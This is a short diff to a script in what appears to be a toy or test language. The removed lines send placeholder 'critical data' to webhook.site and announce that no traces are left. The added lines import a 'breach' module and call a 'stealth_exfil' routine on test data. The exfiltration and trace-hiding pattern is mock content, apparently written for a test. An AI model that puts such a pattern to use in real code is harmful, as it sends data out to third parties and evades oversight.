@@ -1,10 +1,9 @@
-log "--- INITIATING DATA EXFILTRATION ---";
+import "call.breach";
 
-set webhook_target = resolve "webhook.site";
-set intel = "CRITICAL_DATA_EXTRACTED_FROM_TARGET";
+log "--- STARTING MAIN ROUTINE ---";
 
-log "Transmitting payload to cloud...";
+set exfil_data = "Import test";
 
-transmit webhook_target 80 intel;
+call stealth_exfil;
 
-log "--- EXFILTRATION COMPLETE. NO TRACES LEFT ---";
+log "--- ROUTINE FINISHED ---";
